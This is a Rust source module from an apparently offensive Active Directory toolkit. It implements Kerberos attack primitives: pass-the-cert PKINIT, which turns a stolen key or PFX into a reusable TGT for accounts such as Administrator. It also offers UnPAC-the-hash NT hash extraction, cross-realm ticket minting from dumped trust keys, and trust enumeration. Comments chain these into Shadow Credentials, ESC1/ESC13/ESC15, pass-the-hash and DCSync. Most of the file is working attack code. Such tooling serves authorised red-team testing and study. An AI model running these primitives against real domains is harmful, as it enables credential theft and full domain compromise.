//! `kerb` — direct Kerberos primitives that do not need an LDAP collect.
//!
//! First inhabitants:
//! - `kerb pkinit` (F1a) — raw pass-the-cert: private key (+ optional CA-issued
//!   cert) → PA-PK-AS-REQ → AS-REP → real TGT written to a reusable ccache.
//!   Uses the mature CMS/DH/AS-REQ implementation in `adhammer_kerberos::pkinit`
//!   (same primitive that powers `attack esc1 --pkinit` and
//!   `attack abuse --action pkinit`), surfaced as a first-class verb so an
//!   operator with a `.key.pem` (+ optional `.crt`) does not need to invoke an
//!   ESC1 flow to convert it into a TGT.
//!
//! Also here:
//! - `kerb u2u-nt` (F1c) — alias for `attack unpac`, surfaced under the
//!   Kerberos group: PKINIT with a cert (self-signed for key-trust; CA-issued
//!   for cert-based) → capture AS-REP `PAC_CREDENTIAL_INFO` → decrypt at key
//!   usage 16 → print the impersonated principal's NT hash. Same underlying
//!   primitive as `attack unpac`, exposed here so operators looking for the
//!   PAC-credentials shape find it under `kerb`.
//!
//! F3 (`kerb trust-mint` / `kerb trust-dump`) lands under the same group when
//! ms-lsad v0.3 (`LsarRetrievePrivateData`) publishes.

use anyhow::{bail, Context, Result};
use clap::{Parser, Subcommand};

use crate::ui;

#[derive(Subcommand)]
pub(crate) enum KerbCmd {
    /// Raw pass-the-cert: `--key <pem> [--cert <der|pem>] --user --realm --kdc`
    /// → run PKINIT (RFC 4556) → write the resulting TGT to a reusable ccache.
    ///
    /// Without `--cert` this is **key-trust PKINIT** (self-signed cert; the KDC
    /// matches the key against `msDS-KeyCredentialLink` — the Shadow-Credentials
    /// path). With `--cert` it is **cert-based PKINIT** (the CA-issued cert is
    /// embedded in the CMS and validated against the KDC's NTAuth store — the
    /// ESC1/ESC13/ESC15 path). Chains cleanly from `attack shadowcred --add`
    /// (produces the PEM key) or `attack esc1` (produces both).
    Pkinit(PkinitArgs),
    /// F1c — PKINIT then extract the NT hash from the AS-REP's
    /// `PAC_CREDENTIAL_INFO` padata. Same underlying code path as
    /// `attack unpac`; exposed here so operators find the PAC-credentials
    /// primitive under the Kerberos verb tree.
    ///
    /// Chain: `kerb u2u-nt --key x.key.pem --cert x.crt --user Administrator
    /// --realm CORP.LOCAL --kdc dc.corp.local` → NT hash → PtH into
    /// `attack ptt` / `attack dcsync` / `attack exec`.
    U2uNt(crate::attacks::unpac::UnpacArgs),
    /// F3 — cross-realm TGT from a trust key. Thin wrapper over
    /// `attack asktgt` with a `$`-suffix trust account. Feed the incoming
    /// or outgoing trust key you dumped via `kerb trust-dump` (or an
    /// external tool — see `docs/GAPS.md#f3-trust-dump`).
    ///
    /// Example: `kerb trust-mint --user CHILD$ --realm PARENT.LOCAL
    /// --kdc parent-dc --nt-hash <rc4-of-trust-key>`.
    TrustMint(TrustMintArgs),
    /// **[PARTIAL]** F3 — enumerate cross-forest trusts. **The LDAP-side
    /// half works:** inventory of `trustedDomain` objects (partner FQDNs,
    /// direction, trust type, selective auth) via the collector. **The
    /// LSA-side half does not:** the trust-key extract (`G$$<partner>` via
    /// `LsarRetrievePrivateData`) is blocked on ms-lsad v0.3. The verb
    /// prints an inline `[hint]` pointing at an external dumper for the
    /// missing half, per `docs/GAPS.md#f3-trust-dump`. Name kept as
    /// `trust-dump` (not `trust-enum`) since the LSA half is imminent —
    /// once ms-lsad v0.3 publishes, this verb takes over both halves and
    /// the `[PARTIAL]` marker drops.
    TrustDump(TrustDumpArgs),
}

#[derive(Parser)]
pub(crate) struct TrustMintArgs {
    /// Trust account SAM — always `$`-suffixed on Windows (e.g. `PARENT$`).
    #[arg(long)]
    pub user: String,
    /// Target realm to auth against (the FOREIGN realm's KDC — the trust key
    /// is the shared secret between the two realms).
    #[arg(long)]
    pub realm: String,
    /// Foreign realm's KDC (host or IP).
    #[arg(long)]
    pub kdc: String,
    /// Trust key as an RC4 NT hash (32 hex chars). One of --nt-hash or --password.
    #[arg(long, conflicts_with = "password")]
    pub nt_hash: Option<adhammer_core::SecretString>,
    /// Alternative: plaintext trust "password" (rare — usually only the hash is dumped).
    #[arg(long, conflicts_with = "nt_hash")]
    pub password: Option<adhammer_core::SecretString>,
    /// Output ccache path. Default: `<user>.ccache`.
    #[arg(long, value_name = "PATH")]
    pub out: Option<String>,
}

#[derive(Parser)]
pub(crate) struct TrustDumpArgs {
    /// LDAP URL — the LOCAL realm's DC (we enumerate trusted-domain objects
    /// as an authenticated user on this side).
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long, default_value = "")]
    pub password: adhammer_core::SecretString,
    #[arg(long)]
    pub insecure: bool,
    /// Emit the `[hint]` external-tool block for the LSA-side extract.
    #[arg(long, default_value_t = true)]
    pub hint_external: bool,
}

#[derive(Parser)]
pub(crate) struct PkinitArgs {
    /// Private key in PKCS#8 PEM (`-----BEGIN PRIVATE KEY-----`). Mutually
    /// exclusive with `--pfx`. Use `--cert` for the paired CA cert (or omit
    /// for self-signed key-trust PKINIT).
    #[arg(long, value_name = "PATH", conflicts_with = "pfx")]
    pub key: Option<String>,

    /// Optional CA-issued client-auth certificate (DER or PEM). Present = cert
    /// PKINIT; absent = key-trust PKINIT (self-signed cert built from `--key`).
    /// Ignored when `--pfx` is set (the cert is read out of the bundle).
    #[arg(long, value_name = "PATH")]
    pub cert: Option<String>,

    /// PKCS#12 bundle (`.pfx` / `.p12`) containing BOTH the private key and
    /// the paired cert — decoded inline. Mutually exclusive with `--key`.
    /// If the bundle is password-protected, use `--pfx-password`.
    #[arg(long, value_name = "PATH", conflicts_with = "key")]
    pub pfx: Option<String>,

    /// Password for `--pfx` (blank for unencrypted bundles). Prefer
    /// `@file:/path/to/pw` or `$ADHAMMER_PASSWORD`.
    #[arg(long, default_value = "")]
    pub pfx_password: adhammer_core::SecretString,

    /// Principal to authenticate as, e.g. `Administrator` (without realm) or
    /// `Administrator@CORP.LOCAL`. Realm is taken from `--realm`.
    #[arg(long)]
    pub user: String,

    /// Kerberos realm, e.g. `CORP.LOCAL`. Upper-cased before use.
    #[arg(long)]
    pub realm: String,

    /// KDC `host[:port]`, e.g. `dc.corp.local` or `10.0.0.10`. Default port 88.
    #[arg(long)]
    pub kdc: String,

    /// Output ccache path. Default: `<user>.ccache` in the CWD. Written with
    /// the S-tier secret-artifact writer (Unix 0600 / Windows protected DACL).
    #[arg(long, value_name = "PATH")]
    pub out: Option<String>,
}

/// Return the DER form of a cert whose bytes may be DER or PEM. Tolerates
/// multi-cert PEM chains by taking only the first `CERTIFICATE` block.
fn decode_cert_bytes_any(raw: &[u8]) -> Result<Vec<u8>> {
    if !raw.starts_with(b"-----BEGIN") {
        return Ok(raw.to_vec());
    }
    let text = std::str::from_utf8(raw).context("cert PEM is not UTF-8")?;
    let mut in_body = false;
    let mut b64 = String::new();
    for line in text.lines() {
        let l = line.trim();
        if l.starts_with("-----BEGIN") {
            in_body = true;
            continue;
        }
        if l.starts_with("-----END") {
            break;
        }
        if in_body {
            b64.push_str(l);
        }
    }
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(b64.as_bytes())
        .map_err(|e| anyhow::anyhow!("decode cert PEM body: {e}"))
}

/// Read a cert file that may be DER or PEM and return DER bytes.
fn read_cert_any(path: &str) -> Result<Vec<u8>> {
    let raw = std::fs::read(path).with_context(|| format!("read --cert {path}"))?;
    decode_cert_bytes_any(&raw)
}

/// Re-export of [`read_cert_any`] for F1b (ldap auth), which reuses the same
/// PEM-or-DER cert loader.
pub(crate) fn read_cert_der(path: &str) -> Result<Vec<u8>> {
    read_cert_any(path)
}

/// F1a `--pfx` — extract (PKCS#8-PEM private key, first client-cert DER) from
/// a `.pfx` / `.p12` bundle at `path` with `password` (empty for unencrypted
/// bundles). adhammer_kerberos::pkinit takes a PEM key; PFX carries the key
/// as a PKCS#8 DER, so we base64-wrap + `-----BEGIN PRIVATE KEY-----` frame
/// it inline (no pkcs8 dep — the wrap is ~15 LOC either way).
///
/// Re-exposed as `decode_pfx_bundle_for_reuse` for the interactive PTC wizard
/// (interactive.rs) which needs to extract once, then twice (pkinit → unpac).
pub(crate) fn decode_pfx_bundle_for_reuse(path: &str, password: &str) -> Result<(String, Vec<u8>)> {
    decode_pfx_bundle(path, password)
}

fn decode_pfx_bundle(path: &str, password: &str) -> Result<(String, Vec<u8>)> {
    let bytes = std::fs::read(path).with_context(|| format!("read --pfx {path}"))?;
    let pfx = p12::PFX::parse(&bytes).map_err(|e| anyhow::anyhow!("parse PFX: {e:?}"))?;

    // Client cert — take the first cert bag. The p12 crate returns each cert as
    // raw DER bytes (already stripped of the SafeContents wrapping).
    let certs = pfx
        .cert_bags(password)
        .map_err(|e| anyhow::anyhow!("PFX cert bags: {e:?}"))?;
    let cert_der = certs
        .into_iter()
        .next()
        .ok_or_else(|| anyhow::anyhow!("PFX has no cert bags"))?;

    // Key bag — the DER is a PKCS#8 PrivateKeyInfo (standard for openssl /
    // Windows certutil output). Wrap directly as PKCS#8 PEM.
    let keys = pfx
        .key_bags(password)
        .map_err(|e| anyhow::anyhow!("PFX key bags: {e:?}"))?;
    let key_der = keys
        .into_iter()
        .next()
        .ok_or_else(|| anyhow::anyhow!("PFX has no key bags"))?;

    Ok((der_to_pkcs8_pem(&key_der), cert_der))
}

/// Wrap PKCS#8 DER bytes into a `-----BEGIN PRIVATE KEY-----` PEM block with
/// standard 64-column base64 line wrapping. `adhammer_kerberos::pkinit::pkinit_with_cert`
/// calls `RsaPrivateKey::from_pkcs8_pem` on this — that entry point wants a
/// PEM whose label is exactly `PRIVATE KEY` (PKCS#8), not `RSA PRIVATE KEY`
/// (PKCS#1).
fn der_to_pkcs8_pem(der: &[u8]) -> String {
    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(der);
    let mut pem = String::with_capacity(b64.len() + 96);
    pem.push_str("-----BEGIN PRIVATE KEY-----\n");
    for chunk in b64.as_bytes().chunks(64) {
        pem.push_str(std::str::from_utf8(chunk).unwrap());
        pem.push('\n');
    }
    pem.push_str("-----END PRIVATE KEY-----\n");
    pem
}

/// `kerb pkinit` — run PKINIT with the supplied key (+ optional cert) and
/// persist the resulting TGT to a reusable ccache.
pub(crate) async fn pkinit(a: PkinitArgs) -> Result<()> {
    let mut checklist = ui::StageChecklist::new([
        "load private key (PEM)",
        "load cert (--cert; else self-signed)",
        "PKINIT AS-exchange (KDC)",
        "write TGT ccache",
    ]);
    let result = pkinit_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Kerb PKINIT stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Kerb PKINIT stages (failed)");
        }
    }
    result
}

async fn pkinit_impl(a: PkinitArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    // Resolve inputs — either --pfx (decode inline) or --key + optional --cert.
    let (key_pem, cert_der_from_pfx): (String, Option<Vec<u8>>) =
        if let Some(pfx_path) = a.pfx.as_deref() {
            let pw = crate::resolve_secret(&a.pfx_password, "ADHAMMER_PFX_PASSWORD")?;
            let (pem, cert) = decode_pfx_bundle(pfx_path, pw.expose_secret())
                .with_context(|| format!("decode PFX bundle {pfx_path}"))?;
            checklist.record_ok(
                "load private key (PEM)",
                format!("{pfx_path} (PFX → {} B PEM key)", pem.len()),
            );
            (pem, Some(cert))
        } else {
            let key_path = a
                .key
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("supply one of --key <pem> or --pfx <bundle>"))?;
            let key_pem = std::fs::read_to_string(key_path)
                .with_context(|| format!("read --key {key_path}"))?;
            if !key_pem.contains("-----BEGIN") {
                bail!(
                    "--key {} does not look like a PEM private key (no `-----BEGIN` header)",
                    key_path
                );
            }
            checklist.record_ok(
                "load private key (PEM)",
                format!("{key_path} ({} bytes)", key_pem.len()),
            );
            (key_pem, None)
        };

    let cert_der: Option<Vec<u8>> = if let Some(inline) = cert_der_from_pfx {
        checklist.record_ok(
            "load cert (--cert; else self-signed)",
            format!("(from PFX, {} bytes DER)", inline.len()),
        );
        Some(inline)
    } else if let Some(cp) = a.cert.as_deref() {
        let der = read_cert_any(cp)?;
        checklist.record_ok(
            "load cert (--cert; else self-signed)",
            format!("{cp} ({} bytes DER)", der.len()),
        );
        Some(der)
    } else {
        checklist.record_ok(
            "load cert (--cert; else self-signed)",
            "self-signed (key-trust PKINIT / Shadow Credentials)",
        );
        None
    };

    // Strip domain / DOMAIN\ shape from --user; the KDC wants the bare cname.
    let user = a
        .user
        .split('@')
        .next()
        .unwrap_or(&a.user)
        .rsplit('\\')
        .next()
        .unwrap_or(&a.user)
        .to_string();
    let realm = a.realm.to_uppercase();

    let sp = ui::Spinner::start(format!("PKINIT as {user}@{realm} via {}", a.kdc));
    let tgt = adhammer_kerberos::pkinit::pkinit_with_cert(
        &user,
        &realm,
        &a.kdc,
        &key_pem,
        cert_der.as_deref(),
    )
    .await
    .with_context(|| format!("PKINIT AS-exchange failed for {user}@{realm} via {}", a.kdc))?;
    sp.done(&format!(
        "TGT obtained: sname={}, endtime={}",
        tgt.sname, tgt.end_time
    ));
    checklist.record_ok(
        "PKINIT AS-exchange (KDC)",
        format!("sname={}, endtime={}", tgt.sname, tgt.end_time),
    );

    let ccache_path = a.out.clone().unwrap_or_else(|| format!("{user}.ccache"));
    adhammer_core::write_secret_artifact(
        std::path::Path::new(&ccache_path),
        adhammer_core::SecretArtifact::Ccache,
        tgt.ccache.expose(),
    )?;
    checklist.record_ok(
        "write TGT ccache",
        format!("{ccache_path} ({} bytes)", tgt.ccache.expose().len()),
    );

    ui::ok(&format!(
        "PKINIT OK — TGT for {user}@{realm} → {ccache_path}"
    ));
    println!("KRB5CCNAME={ccache_path}");
    println!(
        "  \u{2192} next: attack dcsync --kdc {} --user {user} --realm {realm} --ccache {ccache_path} <target>",
        a.kdc
    );
    Ok(())
}

/// F3 — cross-realm TGT via a trust account. `attack asktgt` already handles
/// the AS-REQ with `--nt-hash` (overpass-the-hash) — trust-mint reshapes it
/// so operators looking for the "cross-forest trust-key → ticket" primitive
/// find it under the Kerberos group with matching docs.
pub(crate) async fn trust_mint(a: TrustMintArgs) -> Result<()> {
    if !a.user.ends_with('$') {
        crate::ui::warn(
            "trust accounts are `$`-suffixed on Windows (e.g. PARENT$) — proceeding, but the KDC will likely reject a non-trust SAM.",
        );
    }
    // Reuse attack asktgt's argument struct, which already implements the
    // AS-REQ round-trip with hash or password + ccache write.
    let a2 = crate::attacks::asktgt::AsktgtArgs {
        user: a.user.clone(),
        realm: a.realm.clone(),
        kdc: a.kdc.clone(),
        nt_hash: a.nt_hash,
        password: a.password,
        out: Some(
            a.out
                .clone()
                .unwrap_or_else(|| format!("{}.ccache", a.user)),
        ),
    };
    println!(
        "[*] cross-realm TGT: user={} realm={} kdc={}",
        a.user, a.realm, a.kdc
    );
    crate::attacks::asktgt::asktgt(a2).await
}

/// F3 — enumerate `trustedDomain` objects on the local DC via LDAP. Prints a
/// per-trust row + emits the external-tool hint for the LSA-side secret
/// extract (ms-lsad v0.3 is still deferred).
pub(crate) async fn trust_dump(mut a: TrustDumpArgs) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;

    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
        allow_plaintext_bind: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let base = c.base_dn().to_string();
    let system_dn = format!("CN=System,{base}");

    let entries = c
        .search_subtree(
            &system_dn,
            "(objectClass=trustedDomain)",
            vec![
                "trustPartner",
                "flatName",
                "trustDirection",
                "trustType",
                "trustAttributes",
            ],
        )
        .await
        .context("LDAP search for trustedDomain objects")?;

    if entries.is_empty() {
        println!("[i] no `trustedDomain` objects visible under {system_dn}");
        return Ok(());
    }

    println!(
        "[+] {} cross-forest / cross-domain trust(s):",
        entries.len()
    );
    for e in &entries {
        let get = |k: &str| e.attrs.get(k).and_then(|v| v.first()).cloned();
        let name = get("trustPartner")
            .or_else(|| get("flatName"))
            .unwrap_or_else(|| "?".to_string());
        let direction = get("trustDirection")
            .as_deref()
            .map(trust_direction_name)
            .unwrap_or("?");
        let ttype = get("trustType")
            .as_deref()
            .map(trust_type_name)
            .unwrap_or("?");
        let attrs = get("trustAttributes")
            .as_deref()
            .map(trust_attrs_summary)
            .unwrap_or_else(|| "?".to_string());
        println!("  · {name}\tdirection={direction}\ttype={ttype}\tattrs={attrs}");
    }

    if a.hint_external {
        let mut p = crate::gap_hint::HintParams::new();
        // Pass the URL host as the target-DC hint slot; caller adjusts.
        p.dc_host = Some(host_from_ldap_url(&a.url));
        p.user = Some(a.user);
        crate::gap_hint::hint_external(crate::gap_hint::Gap::TrustDump, &p);
    }
    Ok(())
}

fn trust_direction_name(v: &str) -> &'static str {
    match v {
        "1" => "inbound",
        "2" => "outbound",
        "3" => "bidirectional",
        _ => "?",
    }
}

fn trust_type_name(v: &str) -> &'static str {
    match v {
        "1" => "downlevel-NT4",
        "2" => "AD-forest-internal",
        "3" => "external-realm",
        "4" => "MIT-Kerberos",
        _ => "?",
    }
}

/// Summarize the `trustAttributes` bitmask into short mnemonics.
fn trust_attrs_summary(v: &str) -> String {
    let Ok(bits) = v.parse::<u64>() else {
        return v.to_string();
    };
    let mut names: Vec<&'static str> = Vec::new();
    if bits & 0x0001 != 0 {
        names.push("NON_TRANSITIVE");
    }
    if bits & 0x0002 != 0 {
        names.push("UPLEVEL_ONLY");
    }
    if bits & 0x0004 != 0 {
        names.push("QUARANTINED_DOMAIN"); // SID filtering
    }
    if bits & 0x0008 != 0 {
        names.push("FOREST_TRANSITIVE");
    }
    if bits & 0x0010 != 0 {
        names.push("CROSS_ORGANIZATION");
    }
    if bits & 0x0040 != 0 {
        names.push("TREAT_AS_EXTERNAL");
    }
    if names.is_empty() {
        format!("0x{bits:x}")
    } else {
        format!("0x{bits:x}[{}]", names.join(","))
    }
}

fn host_from_ldap_url(url: &str) -> String {
    url.trim_start_matches("ldaps://")
        .trim_start_matches("ldap://")
        .split('/')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decode_cert_bytes_any_handles_pem() {
        let pem = b"-----BEGIN CERTIFICATE-----\nAAECAwQFBgc=\n-----END CERTIFICATE-----\n";
        let der = decode_cert_bytes_any(pem).unwrap();
        assert_eq!(der, vec![0u8, 1, 2, 3, 4, 5, 6, 7]);
    }

    #[test]
    fn decode_cert_bytes_any_passes_der_through() {
        let der = vec![0x30u8, 0x82, 0x01, 0x00, 0xAA];
        assert_eq!(decode_cert_bytes_any(&der).unwrap(), der);
    }

    #[test]
    fn decode_cert_bytes_any_takes_first_of_chain() {
        let pem = b"-----BEGIN CERTIFICATE-----\nAAEC\n-----END CERTIFICATE-----\n\
                    -----BEGIN CERTIFICATE-----\nAwQF\n-----END CERTIFICATE-----\n";
        assert_eq!(decode_cert_bytes_any(pem).unwrap(), vec![0u8, 1, 2]);
    }
}
